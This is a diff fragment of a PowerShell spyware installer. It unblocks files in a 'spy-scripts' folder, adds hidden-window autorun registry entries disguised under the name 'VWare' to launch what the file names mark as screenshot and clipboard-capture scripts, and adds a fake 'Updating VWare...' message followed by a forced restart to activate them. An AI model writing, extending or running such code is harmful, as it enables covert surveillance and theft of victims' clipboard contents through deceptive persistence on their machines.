@@ -11,3 +11,6 @@ Unblock-File "$env:TEMP\spy-scripts\*"
 #New-ItemProperty -Path $registryPath -Name "VWare2" -Value 'powershell.exe -WindowStyle Hidden -File "$env:TEMP\spy-scripts\.clipboard.ps1"' -PropertyType String -Force
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "VWare" /t REG_SZ /F /D "Powershell.exe -WindowStyle Hidden -File $ss"
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "VWare2" /t REG_SZ /F /D "Powershell.exe -WindowStyle Hidden -File $cb"
+Write-Host "Updating VWare..."
+Start-Sleep 5
+Restart-Computer
